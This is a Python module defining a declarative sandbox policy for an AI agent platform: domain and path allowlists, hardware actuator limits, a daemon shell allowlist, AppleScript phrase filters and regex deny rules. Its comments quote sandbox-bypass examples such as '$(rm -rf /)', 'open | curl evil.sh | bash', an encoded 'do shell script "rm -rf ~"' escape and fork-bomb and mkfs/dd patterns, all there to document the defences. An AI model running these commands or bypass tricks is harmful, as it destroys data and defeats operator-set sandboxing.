"""
FERAL Sandbox Policies — Declarative Security for Hardware + Software
=======================================================================
NemoClaw uses YAML policies for network/filesystem sandboxing.
FERAL extends this to HARDWARE — you can declare what a device is
allowed to do, what sensors can be read, what actuators can move,
and at what rate.

This is the missing piece in every other agent system:
  NemoClaw can sandbox which URLs a process can reach.
  FERAL can sandbox which direction a robot arm can move.

Policy file: ~/.feral/policies/default.yaml (or per-device)
"""

from __future__ import annotations
import json
import logging
import re
import time
from pathlib import Path
from typing import Optional

from config.loader import feral_home
from security.command_unwrap import obfuscation_findings
from security.safe_regex import UnsafePatternError, compile_safe_regex

logger = logging.getLogger("feral.sandbox_policy")

_GRANTS_FILE = "workspace_grants.json"


class SandboxPolicy:
    """
    Declarative security policy that governs what agents and devices can do.
    Loaded from YAML/dict configuration.
    """

    def __init__(self, policy_data: Optional[dict] = None):
        self._data = policy_data or self._default_policy()
        self._full_authority_logged = False

    @staticmethod
    def _default_policy() -> dict:
        return {
            "version": "1.0",
            "name": "default",
            "description": "FERAL default safety policy",

            "permissions": {
                "max_tier": "active",
                "require_confirmation_above": "active",
                "auto_approve_categories": ["sensor", "display"],
            },

            "network": {
                "mode": "allowlist",
                "allowed_domains": [
                    "api.openai.com",
                    "api.anthropic.com",
                    "generativelanguage.googleapis.com",
                    "api.tavily.com",
                    "api.github.com",
                    "*.supabase.co",
                ],
                "blocked_domains": [],
                "max_requests_per_minute": 60,
            },

            "filesystem": {
                "read_paths": [
                    "~/.feral/",
                    "/tmp/feral/",
                ],
                "write_paths": [
                    "~/.feral/skills/",
                    "~/.feral/memory/",
                    "/tmp/feral/",
                ],
                "blocked_paths": [
                    "~/.ssh/",
                    "~/.aws/",
                    "~/.gnupg/",
                ],
            },

            "hardware": {
                "sensors": {
                    "allowed": ["heart_rate", "spo2", "temperature", "uv", "steps",
                                "accelerometer", "gyroscope", "ambient_light", "gps",
                                "telemetry"],
                    "blocked": [],
                    "max_read_rate_per_second": {
                        "heart_rate": 1,
                        "spo2": 0.1,
                        "temperature": 0.05,
                        "gps": 0.2,
                    },
                },
                # Entries are matched against the HUP capability id the
                # caller actually sends (``/api/hardware/execute``'s
                # ``capability_id``), so this list has to name capabilities,
                # not device categories. The first four are the generic
                # actuator-type names the reference glasses manifest
                # declares in ``DeviceManifest.actuators``
                # (``hardware/protocol.py``); the rest are the capability
                # ids every in-repo adapter exposes. Before audit P0.4 this
                # list had no reader at all, so its contents had no effect;
                # wiring the check without extending it would have denied
                # the CuteBot, the robot arm and the Hue bridge on a fresh
                # install. ``test_default_policy_permits_every_shipped_actuator``
                # fails if an adapter grows a capability this misses.
                "actuators": {
                    "allowed": [
                        # generic actuator types (glasses / phone manifests)
                        "display", "speaker", "haptic", "led",
                        # hardware/protocol.py — reference glasses
                        "display_notification", "play_audio",
                        # hardware/mesh.py — phone node
                        "notification",
                        # hardware/adapters/cutebot.py
                        "follow_line", "explore", "halt", "drive", "set_lights",
                        # hardware/adapters/robot_arm.py
                        "move_joints", "move_cartesian", "gripper", "home", "estop",
                        # hardware/adapters/smart_home.py
                        "lights_toggle", "lights_brightness", "lights_color",
                        "scene_activate",
                    ],
                    "blocked": [],
                    "requires_confirmation": ["motor", "servo", "relay", "lock", "valve"],
                    "max_actions_per_minute": 30,
                },
                "cameras": {
                    "allowed": True,
                    "max_captures_per_minute": 6,
                    "auto_analyze": True,
                    "store_frames": False,
                },
                "movement": {
                    "max_speed_pct": 50,
                    "restricted_zones": [],
                    "emergency_stop_enabled": True,
                    "requires_confirmation_above_speed": 30,
                },
            },

            "skills": {
                "allow_generation": True,
                "require_approval": True,
                "max_pending": 10,
                "blocked_skill_ids": [],
                "rate_limits": {},
            },

            "memory": {
                "allow_persistent_storage": True,
                "allow_knowledge_graph": True,
                "max_notes": 10000,
                "max_episodes": 5000,
                "auto_forget_after_days": None,
            },

            # ``["*"]``, not ``[]``: server names come from the operator's
            # own ``~/.feral/mcp_servers.json``, so there is nothing for the
            # shipped policy to enumerate. The wildcard states the shipped
            # posture explicitly and lets an empty list mean what an empty
            # list means everywhere else in this file. See
            # :meth:`can_use_mcp_server`.
            "mcp": {
                "allow_external_servers": True,
                "allowed_servers": ["*"],
                "blocked_servers": [],
                "max_concurrent_connections": 5,
            },

            "execution": {
                "max_tool_calls_per_turn": 20,
                "max_total_actions_per_session": 200,
                "timeout_per_action_ms": 30000,
                # Desktop brain default; allowlist + metachar reject in validate_shell_command provides the safety surface.
                "allow_shell_commands": True,
                "allow_file_write": False,
                "allow_network_requests": True,
                # Extra deny regexes for the workspace shell, on top of
                # the reviewed floor in ``_COMMAND_DENY_FLOOR``. Empty by
                # default: the floor is the shipped behaviour and an
                # operator adds site-specific rules here. Read by
                # ``denied_command_patterns()`` and compiled through
                # ``security.safe_regex``, so a rule that could backtrack
                # catastrophically is dropped with a warning instead of
                # hanging the checker.
                "denied_command_patterns": [],
            },

            # audit-r12 A3 (v2026.5.38) — ``daemon://local/shell`` enforcement.
            # The pre-fix executor accepted any string with a substring
            # blocklist (``"rm "``, ``"sudo "``, …) and forwarded it to
            # ``subprocess.run(shell=True)``. That is trivially bypassable —
            # ``$(rm -rf /)`` does not contain the literal ``"rm "`` substring
            # the blocklist scans for, and ``rm$IFS-rf$IFS/`` defeats word-
            # boundary checks. The replacement is an explicit program
            # allowlist that must match the first argv token after shlex
            # parsing; everything else is rejected. Lane 05 wires
            # ``validate_shell_command()`` into ``skills/executor.py``.
            # v2026.5.42 — daemon shell allowlist expanded to cover vetted
            # macOS staples that the pre-fix substring blocklist used to let
            # through. Every entry below is a non-destructive program that
            # does not require sudo, does not write outside its argv
            # contract, and was implicitly trusted under the legacy
            # blocklist. ``validate_shell_command`` still rejects shell
            # metacharacters ($ ` | & ; > < \\n \\r \\) so an allowlisted
            # binary cannot smuggle a different program through (e.g.
            # ``say "$(rm -rf /)"`` rejects on the metachar check before the
            # argv[0] check).
            "daemon": {
                "shell": {
                    "allowed_commands": [
                        # Original audit-r12 A3 triple
                        "open",
                        "osascript",
                        "screencapture",
                        # v2026.5.42 vetted macOS staples
                        "say",            # text-to-speech (demo + notification surface)
                        "pbcopy",         # write to clipboard
                        "pbpaste",        # read from clipboard
                        "defaults",       # read/write user defaults (system-settings skill)
                        "system_profiler", # hardware/software inventory (read-only)
                        "sw_vers",        # OS version (read-only)
                        "caffeinate",     # prevent sleep (long-running task UX)
                        "mdfind",         # Spotlight query (read-only)
                        "date",           # current date (read-only)
                        "uname",          # system info (read-only)
                    ],
                },
                # ``osascript`` sits on the shell allowlist above, and
                # ``daemon://local/applescript`` ran ``osascript -e <command>``
                # with no validation at all while its sibling
                # ``daemon://local/shell`` 15 lines below was fully validated.
                # AppleScript can invoke a shell (``do shell script "…"``),
                # load another script, or reach into ObjC and spawn an
                # ``NSTask``, so the unvalidated path simply defeated the
                # validated one: ``osascript -e 'do shell script "rm -rf ~"'``
                # contains none of the rejected metacharacters and argv[0] is
                # allowlisted. These phrases are matched case-insensitively
                # against the whitespace-collapsed script, so ``do  shell
                # script`` and ``DO SHELL SCRIPT`` are caught too.
                "applescript": {
                    "max_length": 4000,
                    "denied_phrases": [
                        "do shell script",   # direct shell escape
                        "do script",         # Terminal.app / Script Editor exec
                        "run script",        # evaluate another script body
                        "load script",       # load a compiled script from disk
                        "osascript",         # nested re-entry
                        "use framework",     # ObjC bridge (NSTask, NSAppleScript)
                        "current application's",  # ObjC bridge accessor
                        "nstask",            # process spawn via ObjC
                        "system attribute",  # environment/secret read-out
                        "open location",     # arbitrary URL-scheme handler
                    ],
                },
            },

            "wasm": {
                "enabled": True,
                "memory_limit_mb": 64,
                "timeout_seconds": 5,
                "fuel_limit": 1_000_000,
                "allowed_host_functions": [
                    "feral_log",
                    "feral_get_param",
                    "feral_set_result",
                    "feral_http_get",
                    "feral_http_post",
                ],
                "allowed_domains": [
                    "api.openai.com",
                    "api.tavily.com",
                ],
            },
        }

    @classmethod
    def load_from_file(cls, path: str) -> "SandboxPolicy":
        """Load a policy from a YAML or JSON file."""
        file_path = Path(path)
        if not file_path.exists():
            logger.info(f"Policy file not found, using defaults: {path}")
            return cls()

        import json
        if file_path.suffix in (".yaml", ".yml"):
            try:
                import yaml
                with open(file_path) as f:
                    data = yaml.safe_load(f)
            except ImportError:
                logger.warning("PyYAML not installed, falling back to JSON")
                return cls()
        else:
            with open(file_path) as f:
                data = json.load(f)

        return cls(data)

    @classmethod
    def load_default(cls) -> "SandboxPolicy":
        policy_dir = feral_home() / "policies"
        for name in ["default.yaml", "default.yml", "default.json"]:
            p = policy_dir / name
            if p.exists():
                return cls.load_from_file(str(p))
        return cls()

    # ─────────────────────────────────────────
    # Permission Checks
    # ─────────────────────────────────────────

    def can_use_tier(self, tier: str) -> bool:
        from security.vault import PermissionTier
        max_tier = self._data.get("permissions", {}).get("max_tier", "active")
        return PermissionTier.tier_level(tier) <= PermissionTier.tier_level(max_tier)

    def needs_confirmation(self, tier: str) -> bool:
        from security.vault import PermissionTier
        threshold = self._data.get("permissions", {}).get("require_confirmation_above", "active")
        return PermissionTier.tier_level(tier) > PermissionTier.tier_level(threshold)

    # ─────────────────────────────────────────
    # Filesystem Path Enforcement
    # ─────────────────────────────────────────

    def _resolve(self, raw_path: str) -> Path:
        return Path(raw_path).expanduser().resolve()

    def _path_in_list(self, target: Path, patterns: list[str]) -> bool:
        for pat in patterns:
            p = self._resolve(pat)
            try:
                target.relative_to(p)
                return True
            except ValueError:
                continue
        return False

    def _load_grants(self) -> dict:
        gf = feral_home() / _GRANTS_FILE
        if gf.exists():
            try:
                return json.loads(gf.read_text())
            except Exception:
                return {}
        return {}

    def _save_grants(self, grants: dict) -> None:
        gf = feral_home() / _GRANTS_FILE
        gf.parent.mkdir(parents=True, exist_ok=True)
        gf.write_text(json.dumps(grants, indent=2))

    def can_read_path(self, raw_path: str) -> bool:
        target = self._resolve(raw_path)
        fs = self._data.get("filesystem", {})
        if self._path_in_list(target, fs.get("blocked_paths", [])):
            return False
        if self.full_authority():
            # The file tools and the shell answer this question from the
            # same method, and they have to keep agreeing. exec_mode's
            # path check exists precisely so that a path the file tools
            # refuse is not reachable by naming it on a command line; if
            # the shell were lifted and this were not, that invariant
            # would break in the other direction and ``cat`` would reach
            # what ``read_file`` could not.
            #
            # blocked_paths above still wins. It is the operator's own
            # list, and an operator who wrote both meant both.
            return True
        if self._path_in_list(target, fs.get("read_paths", [])):
            return True
        if self._path_in_list(target, fs.get("write_paths", [])):
            return True
        grants = self._load_grants()
        for folder, info in grants.items():
            try:
                target.relative_to(self._resolve(folder))
                return True
            except ValueError:
                continue
        return False

    def resolve_workspace(self, raw_path: str) -> tuple[Optional[str], str]:
        """Return ``(workspace_root, source)`` for ``raw_path``.

        ``source`` is ``"grant"`` when an operator grant in
        ``~/.feral/workspace_grants.json`` covers the path,
        ``"policy_write_path"`` / ``"policy_read_path"`` when only the
        policy's own declared paths do, ``"blocked"`` when the path is on
        ``blocked_paths``, and ``""`` when nothing covers it.

        ``can_read_path`` answers "may I read this?" with a bare bool.
        ``security/exec_mode.py`` needs to know *which* scope authorised
        the path, because a host shell in an explicitly granted project
        folder is a different proposition from a host shell in
        ``~/.feral/``. Strict autonomy accepts only the former.
        """
        target = self._resolve(raw_path)
        fs = self._data.get("filesystem", {})
        if self._path_in_list(target, fs.get("blocked_paths", [])):
            return None, "blocked"

        for folder in self._load_grants():
            root = self._resolve(folder)
            try:
                target.relative_to(root)
                return str(root), "grant"
            except ValueError:
                continue

        for key, source in (("write_paths", "policy_write_path"), ("read_paths", "policy_read_path")):
            for pattern in fs.get(key, []):
                root = self._resolve(pattern)
                try:
                    target.relative_to(root)
                    return str(root), source
                except ValueError:
                    continue

        return None, ""

    def can_write_path(self, raw_path: str) -> bool:
        target = self._resolve(raw_path)
        fs = self._data.get("filesystem", {})
        if self._path_in_list(target, fs.get("blocked_paths", [])):
            return False
        if self._path_in_list(target, fs.get("write_paths", [])):
            return True
        grants = self._load_grants()
        for folder, info in grants.items():
            try:
                target.relative_to(self._resolve(folder))
                if info.get("mode") in ("readwrite", "write"):
                    return True
            except ValueError:
                continue
        return False

    def grant_folder(self, raw_path: str, mode: str = "read") -> dict:
        target = self._resolve(raw_path)
        fs = self._data.get("filesystem", {})
        if self._path_in_list(target, fs.get("blocked_paths", [])):
            return {"ok": False, "error": "Path is in blocked list"}
        grants = self._load_grants()
        grants[str(target)] = {
            "mode": mode,
            "granted_at": time.time(),
        }
        self._save_grants(grants)
        logger.info("Folder grant: %s mode=%s", target, mode)
        return {"ok": True, "path": str(target), "mode": mode}

    def revoke_folder(self, raw_path: str) -> bool:
        target = self._resolve(raw_path)
        grants = self._load_grants()
        key = str(target)
        if key in grants:
            del grants[key]
            self._save_grants(grants)
            return True
        return False

    def list_grants(self) -> list[dict]:
        grants = self._load_grants()
        return [
            {"path": k, "mode": v.get("mode", "read"), "granted_at": v.get("granted_at")}
            for k, v in grants.items()
        ]

    # ─────────────────────────────────────────
    # Network Checks
    # ─────────────────────────────────────────

    def is_domain_blocked(self, domain: str) -> bool:
        """Whether ``network.blocked_domains`` names this host.

        Split out of :meth:`can_access_domain` for the generic HTTP runner
        (``skills/executor.py``), which exempts first-party skills from the
        *allowlist* but never from the *blocklist*: an explicit block is an
        operator decision about a destination and binds every caller.
        """
        blocked = self._data.get("network", {}).get("blocked_domains", []) or []
        return any(self._domain_match(domain, b) for b in blocked)

    def can_access_domain(self, domain: str) -> bool:
        if self.is_domain_blocked(domain):
            return False
        net = self._data.get("network", {})
        mode = net.get("mode", "allowlist")
        if mode == "allowlist":
            allowed = net.get("allowed_domains", [])
            return any(self._domain_match(domain, a) for a in allowed)
        return True

    # ─────────────────────────────────────────
    # Hardware Checks
    # ─────────────────────────────────────────
    #
    # audit P0.4. Four checks in this block used to fail OPEN on a partial
    # policy: ``sensor_type in allowed or not allowed`` reads an empty (or
    # absent) allowlist as "allow everything", where ``can_access_domain``
    # a few lines above reads an empty allowlist as "allow nothing". A
    # partial policy is legal — the route validator deliberately does not
    # require sections — so an operator who wrote a ``network`` block and
    # nothing else had every sensor, actuator, camera and MCP server wide
    # open with no indication. They now deny, matching the network check.
    # The shipped default in ``_default_policy`` names every sensor,
    # actuator and camera FERAL itself uses, so a default install is
    # unaffected; ``tests/test_p0_security_clamps_and_gates.py`` pins that
    # per capability.

    def can_read_sensor(self, sensor_type: str) -> bool:
        hw = self._data.get("hardware", {}).get("sensors", {})
        blocked = hw.get("blocked", [])
        if sensor_type in blocked:
            return False
        return sensor_type in hw.get("allowed", [])

    def can_use_actuator(self, actuator_type: str) -> tuple[bool, bool]:
        """Returns (allowed, needs_confirmation)."""
        hw = self._data.get("hardware", {}).get("actuators", {})
        blocked = hw.get("blocked", [])
        if actuator_type in blocked:
            return False, False
        needs_confirm = actuator_type in hw.get("requires_confirmation", [])
        return actuator_type in hw.get("allowed", []), needs_confirm

    def emergency_stop_enabled(self) -> bool:
        """Whether a stop/halt command bypasses the actuator allowlist.

        Default True, and True in the shipped policy. Refusing a stop leaves
        hardware running, which is a worse outcome than the action the
        refusal prevents, so the allowlist does not get to deny one unless
        the operator turns this off deliberately.
        """
        movement = self._data.get("hardware", {}).get("movement", {})
        return bool(movement.get("emergency_stop_enabled", True))

    def max_movement_speed(self) -> int:
        """Percentage cap on commanded movement speed. Default 50, not 0.

        Deliberately NOT flipped with the four allowlists above. Those
        answer "may this happen at all?", where the fail-closed answer is a
        refusal the caller can see and report. This one answers "how fast?",
        and 0 is not a refusal: it is a command that a device accepts,
        executes as no motion, and acknowledges as success. Every caller
        would then report a move that never happened. A bounded 50% that is
        honestly reported beats a silent no-op. Note that nothing reads this
        yet (see the audit note in ``api/routes/security_and_hardware.py``).
        """
        return self._data.get("hardware", {}).get("movement", {}).get("max_speed_pct", 50)

    def can_capture_camera(self) -> bool:
        cameras = self._data.get("hardware", {}).get("cameras", {})
        return bool(cameras.get("allowed", False))

    # ─────────────────────────────────────────
    # Skill Checks
    # ─────────────────────────────────────────

    def can_generate_skills(self) -> bool:
        return self._data.get("skills", {}).get("allow_generation", True)

    def skill_requires_approval(self) -> bool:
        return self._data.get("skills", {}).get("require_approval", True)

    def is_skill_blocked(self, skill_id: str) -> bool:
        blocked = self._data.get("skills", {}).get("blocked_skill_ids", [])
        return skill_id in blocked

    # ─────────────────────────────────────────
    # MCP Checks
    # ─────────────────────────────────────────

    def can_use_mcp_server(self, server_name: str) -> bool:
        """Whether ``server_name`` may be connected.

        audit P0.4, and the one member of the group whose allowlist cannot
        be a literal enumeration: MCP server names are chosen by the
        operator in ``~/.feral/mcp_servers.json``, so the shipped default
        cannot list them the way it lists sensors and actuators. Rather than
        keep "empty means anything" as an unwritten rule, the default policy
        says ``allowed_servers: ["*"]`` out loud. Empty now denies, an
        absent ``mcp`` section denies, and an operator who wants everything
        writes the wildcard.
        """
        mcp = self._data.get("mcp", {})
        if not mcp.get("allow_external_servers", False):
            return False
        blocked = mcp.get("blocked_servers", [])
        if server_name in blocked:
            return False
        allowed = mcp.get("allowed_servers", [])
        return "*" in allowed or server_name in allowed

    # ─────────────────────────────────────────
    # Execution Checks
    # ─────────────────────────────────────────

    def can_execute_shell(self) -> bool:
        return self._data.get("execution", {}).get("allow_shell_commands", False)

    def max_tool_calls_per_turn(self) -> int:
        return self._data.get("execution", {}).get("max_tool_calls_per_turn", 20)

    # ─────────────────────────────────────────
    # Daemon shell allowlist (audit-r12 A3)
    # ─────────────────────────────────────────

    # Metacharacters that turn ``subprocess.run(shell=True)`` into a generic
    # shell interpreter. ``$(...)`` / ``\`...\``` smuggle commands; ``|`` /
    # ``&`` / ``;`` chain them; ``>`` / ``<`` redirect; ``\\`` and unbalanced
    # quotes evade shlex. Any of these is an automatic reject — even when
    # the first token would otherwise be allowlisted — because we cannot
    # statically reason about the resulting process tree.
    _SHELL_REJECT_CHARS: tuple[str, ...] = (
        "$", "`", "|", "&", ";", ">", "<", "\n", "\r", "\\",
    )

    # Operator-supplied deny rules for the *workspace* shell
    # (``coding_tools__bash`` via ``security.exec_mode``), not the daemon
    # path above, which is an allowlist and does not need them.
    #
    # These strings come out of a policy file an operator edited, which
    # makes them exactly the class of pattern ``security.safe_regex``
    # exists for: a typo'd ``(a+)+`` in a config file would otherwise
    # hang the checker with no timeout and no way to interrupt it. The
    # hardcoded floor below is reviewed in-repo source and is compiled
    # directly, because routing it through the safe compiler would only
    # create pressure to weaken that compiler.
    # ``_CMD_START`` anchors a rule to *command position*: the start of a
    # line, or just after a separator, with any number of ``sudo`` /
    # ``doas`` / ``env`` prefixes consumed. Without it these rules fire on
    # a command that merely mentions the word, and ``grep -r reboot .``
    # becomes a refusal. That false positive is worse than the miss it
    # prevents: an agent that gets refused for grepping learns to route
    # around the check.
    _CMD_START: str = r"(?:^|[;&|]\s*)\s*(?:(?:sudo|doas|env)\s+)*"

    _COMMAND_DENY_FLOOR: tuple[re.Pattern[str], ...] = (
        # ``rm -rf /`` and ``rm -fr ~`` only. ``rm -rf /tmp/build`` and
        # ``rm -rf node_modules`` are ordinary work and stay allowed.
        #
        # Trailing flags are matched as well as a bare end of line. The
        # anchor used to be `\s*$` immediately after the path, so
        # ``rm -rf / --no-preserve-root`` did not match: anything after
        # the slash ended the pattern. That is the wrong one to miss.
        # GNU coreutils refuses ``rm -rf /`` on its own and requires
        # exactly that flag to proceed, so the only spelling that
        # actually destroys a Linux filesystem was the only spelling
        # this floor let through.
        #
        # Only flag-shaped tokens are allowed after the path, never
        # another operand, so ``rm -rf / tmp`` and ``rm -rf /tmp/build``
        # stay outside the pattern and remain ordinary work.
        re.compile(
            _CMD_START
            + r"rm\s+(?:-[a-zA-Z]*\s+)*-?[a-zA-Z]*[rR][a-zA-Z]*f?\s+[/~]"
            + r"(?:\s+--?[a-zA-Z][\w-]*)*\s*$",
            re.I | re.M,
        ),
        re.compile(_CMD_START + r"mkfs(?:\.\w+)?\b", re.I | re.M),
        re.compile(_CMD_START + r"dd\s[^\n]*\bof=/dev/", re.I | re.M),
        # shutdown / reboot / halt / poweroff are deliberately NOT here.
        #
        # The floor is for commands that are catastrophic and never
        # legitimate work: they destroy a filesystem or a device and
        # there is nothing to confirm because no operator wants them.
        # Restarting your own machine is neither. It is reversible, it is
        # ordinary sysadmin, and asking an assistant to do it is a
        # reasonable request.
        #
        # In the floor they were refused at every autonomy tier with no
        # override, so the answer to "reboot my machine" was no, and the
        # operator had no way to say otherwise short of lifting the whole
        # floor. That is a refusal standing in for a question.
        #
        # They are gated as the question they are instead. The bash
        # endpoint is safety_tier "confirm", so strict and hybrid ask
        # before running one. loose runs it without asking, which is what
        # loose means and what the operator chose it for.
        # Fork bomb, in its canonical spelling.
        re.compile(r":\s*\(\s*\)\s*\{.*\|.*&\s*\}\s*;", re.S),
        # Writing to a raw block device is never a workspace operation.
        re.compile(r">\s*/dev/(?:sd|nvme|disk)", re.I),
    )

    def full_authority(self) -> bool:
        """Has a human explicitly taken the floor off?

        ``execution.full_authority: true`` in the policy file. Off unless
        somebody sets it, and deliberately not readable from an
        environment variable: an env var is something you can be handed,
        and this is something you have to sit down and mean.

        It is their computer. The floor exists because a model can spell
        ``mkfs`` for reasons that made sense to the model, not because
        the operator needs protecting from themselves. Somebody who
        writes this key down has said which of those two they are.
        """
        return bool(self._data.get("execution", {}).get("full_authority", False))

    def denied_command_patterns(self) -> list[re.Pattern[str]]:
        """Deny patterns for a workspace shell: the floor plus operator rules.

        The floor is skipped entirely when :meth:`full_authority` is on.
        Operator rules still apply: somebody who granted full authority
        and *also* wrote their own deny list meant both, and the second
        one is theirs.

        Operator rules live at ``execution.denied_command_patterns`` in
        the policy file and are compiled with
        :func:`security.safe_regex.compile_safe_regex`. A rule the safe
        compiler refuses is dropped with a warning rather than crashing
        the policy load: one bad line in a config file must not take the
        brain down, and dropping it is visible in the log while still
        leaving the floor in place.
        """
        if self.full_authority():
            # Once per policy object, not once per command: this is a
            # standing state of the machine and it should be findable in
            # the log afterwards, not a line that scrolls past on every
            # call and trains the reader to skip it.
            if not self._full_authority_logged:
                logger.warning(
                    "execution.full_authority is set: the built-in command "
                    "deny floor is OFF. rm -rf /, mkfs and dd to a raw "
                    "device will run. Remove the key from the policy file "
                    "to restore the floor."
                )
                self._full_authority_logged = True
            patterns: list[re.Pattern[str]] = []
        else:
            patterns = list(self._COMMAND_DENY_FLOOR)
        raw = self._data.get("execution", {}).get("denied_command_patterns", [])
        if not isinstance(raw, list):
            return patterns
        for entry in raw:
            if not isinstance(entry, str) or not entry.strip():
                continue
            try:
                patterns.append(compile_safe_regex(entry, re.IGNORECASE))
            except (UnsafePatternError, re.error) as exc:
                logger.warning(
                    "dropping execution.denied_command_patterns entry %r: %s",
                    entry[:80], exc,
                )
        return patterns

    def daemon_shell_allowlist(self) -> list[str]:
        """Return the configured argv[0] program allowlist for
        ``daemon://local/shell``.

        Defaults to ``["open", "osascript", "screencapture"]`` (the same
        triple the canonical ``agentic_computer_use`` shell action permits).
        Operators override via the policy file at
        ``daemon.shell.allowed_commands``.
        """
        raw = (
            self._data.get("daemon", {})
            .get("shell", {})
            .get("allowed_commands", [])
        )
        if not isinstance(raw, list):
            return []
        return [str(p).strip().lower() for p in raw if str(p).strip()]

    def validate_shell_command(self, command: str) -> tuple[bool, str]:
        """Decide whether a ``daemon://local/shell`` invocation is safe.

        Returns ``(ok, reason)``. ``ok=True`` means the command's first
        token is in :meth:`daemon_shell_allowlist` AND the command
        contains no shell-meaningful metacharacters that would smuggle
        a different program past the allowlist (e.g. ``$(rm -rf /)``,
        ``open; rm -rf ~``, ``open | curl evil.sh | bash``,
        ``open && wipe``, backtick command substitution, redirects).
        ``ok=False`` returns a one-line operator-facing reason.

        Lane 05 wires this into ``skills/executor.py`` so the daemon
        path no longer reaches ``subprocess.run(shell=True)`` with a
        free-form string — the executor now resolves the allowlisted
        program path, splits the remaining argv with ``shlex.split``,
        and execs without a shell.
        """
        if not isinstance(command, str):
            return False, "command must be a string"
        stripped = command.strip()
        if not stripped:
            return False, "empty command"

        for ch in self._SHELL_REJECT_CHARS:
            if ch in stripped:
                return False, (
                    f"shell metacharacter {ch!r} not permitted on "
                    f"daemon://local/shell — chain via separate calls "
                    f"or route to ``coding_tools__bash`` (workspace-scoped)"
                )

        # Pre-normalisation, running after the raw checks and never
        # instead of them: it can only add a refusal.
        #
        # Be clear about what it buys *here*, because the honest answer
        # is "nothing today". Every encoding the unwrapper decodes needs
        # a character the sweep above already rejects: ANSI-C quoting and
        # command substitution both need ``$``, backtick substitution
        # needs a backtick, a pipe-to-shell needs ``|``, a heredoc needs
        # ``<``. Quoting hides a character's *meaning*, never the
        # character, so unwrapping cannot surface a metacharacter that
        # was not in the raw string. On this path the check is
        # unreachable by construction.
        #
        # It stays because the construction is one edit away from being
        # false. The moment somebody relaxes ``_SHELL_REJECT_CHARS`` --
        # dropping ``$`` to allow ``open "$HOME/Doc"`` is the obvious
        # request -- ``osascript -e $'\x64\x6f shell script "rm -rf ~"'``
        # becomes reachable and this is what catches it.
        # ``test_daemon_pre_normalisation_catches_a_relaxed_reject_set``
        # pins that, by relaxing the set exactly as a future edit would.
        #
        # The test is structural rather than another metacharacter sweep.
        # This path is an allowlist of single programs, so ANY nested
        # execution is disqualifying by definition: ``open`` has no
        # legitimate need of a command substitution, a heredoc, a
        # pipe-to-shell, or an ANSI-C literal. Re-running the char sweep
        # over the unwrapped text would instead be a tautology, because
        # the unwrapper joins decoded payloads with newlines and ``\n``
        # is itself a rejected character.
        for finding in obfuscation_findings(stripped):
            return False, (
                f"refusing an obfuscated daemon://local/shell invocation: "
                f"{finding.detail}. The allowlist covers single programs, "
                f"not nested execution."
            )

        try:
            import shlex
            parts = shlex.split(stripped, comments=False, posix=True)
        except ValueError as exc:
            return False, f"could not parse command ({exc}); reject"

        if not parts:
            return False, "empty argv after parsing"

        from pathlib import Path as _P
        head = _P(parts[0]).name.lower()
        allow = self.daemon_shell_allowlist()
        if head not in allow:
            return False, (
                f"program {parts[0]!r} not in daemon shell allowlist "
                f"({', '.join(allow) or '(empty)'})"
            )

        if not self.can_execute_shell():
            return False, (
                "daemon shell is disabled by policy "
                "(execution.allow_shell_commands=false)"
            )

        # ``osascript`` is allowlisted above, which means the shell path can
        # hand a whole AppleScript program to an interpreter without anyone
        # looking at it. Validate the payload with the same rules the
        # ``daemon://local/applescript`` path now uses, otherwise the
        # allowlist is decorative for this one binary.
        if head == "osascript":
            return self._validate_osascript_argv(parts)

        return True, ""

    # ─────────────────────────────────────────
    # AppleScript validation
    # ─────────────────────────────────────────

    def applescript_denied_phrases(self) -> list[str]:
        """Phrases that disqualify an AppleScript payload."""
        raw = (
            self._data.get("daemon", {})
            .get("applescript", {})
            .get("denied_phrases", [])
        )
        if not isinstance(raw, list):
            return []
        return [str(p).strip().lower() for p in raw if str(p).strip()]

    def applescript_max_length(self) -> int:
        raw = (
            self._data.get("daemon", {})
            .get("applescript", {})
            .get("max_length", 4000)
        )
        try:
            return max(1, int(raw))
        except (TypeError, ValueError):
            return 4000

    def validate_applescript(self, script: str) -> tuple[bool, str]:
        """Decide whether an AppleScript payload is safe to run.

        Returns ``(ok, reason)``. The rules mirror
        :meth:`validate_shell_command`'s intent: the caller may drive an
        application (``tell application "Music" to activate``, ``set volume
        output volume 50``) but may not use AppleScript as a general
        interpreter to reach a shell, another script, or the ObjC runtime.

        Matching is done on the whitespace-collapsed, lower-cased script so
        ``do  shell   script`` and ``DO SHELL SCRIPT`` are caught alongside
        the literal phrase.
        """
        if not isinstance(script, str):
            return False, "AppleScript must be a string"
        stripped = script.strip()
        if not stripped:
            return False, "empty AppleScript"

        max_len = self.applescript_max_length()
        if len(stripped) > max_len:
            return False, (
                f"AppleScript exceeds the {max_len}-character policy limit "
                f"({len(stripped)} chars)"
            )

        if "\x00" in stripped:
            return False, "AppleScript contains a NUL byte; reject"

        normalized = " ".join(stripped.lower().split())
        for phrase in self.applescript_denied_phrases():
            if phrase in normalized:
                return False, (
                    f"AppleScript phrase {phrase!r} is not permitted; it can "
                    f"invoke a shell or another interpreter and would bypass "
                    f"the daemon shell allowlist "
                    f"({', '.join(self.daemon_shell_allowlist()) or '(empty)'})"
                )

        return True, ""

    def _validate_osascript_argv(self, parts: list[str]) -> tuple[bool, str]:
        """Validate an ``osascript`` invocation from the shell allowlist.

        Only the ``-e <script>`` form is accepted. A script *file* argument
        is rejected because its contents are not visible to this validator,
        and ``-l <language>`` is rejected because JXA reaches the ObjC
        runtime directly. Every ``-e`` payload goes through
        :meth:`validate_applescript`.
        """
        scripts: list[str] = []
        index = 1
        while index < len(parts):
            token = parts[index]
            if token == "-e":
                if index + 1 >= len(parts):
                    return False, "osascript -e is missing its script argument"
                scripts.append(parts[index + 1])
                index += 2
                continue
            return False, (
                f"osascript argument {token!r} is not permitted; only the "
                f"'-e <script>' form is validated; script files and '-l' "
                f"language selection are rejected"
            )

        if not scripts:
            return False, "osascript requires at least one '-e <script>' argument"

        for script in scripts:
            ok, reason = self.validate_applescript(script)
            if not ok:
                return False, reason
        return True, ""

    # ─────────────────────────────────────────
    # Utils
    # ─────────────────────────────────────────

    @staticmethod
    def _domain_match(domain: str, pattern: str) -> bool:
        if pattern.startswith("*."):
            return domain.endswith(pattern[1:]) or domain == pattern[2:]
        return domain == pattern

    def to_dict(self) -> dict:
        return self._data

    def save(self, path: Optional[str] = None):
        import json
        if path is None:
            p = feral_home() / "policies" / "default.json"
        else:
            p = Path(path)
        p.parent.mkdir(parents=True, exist_ok=True)
        with open(p, "w") as f:
            json.dump(self._data, f, indent=2)
        logger.info(f"Policy saved: {p}")
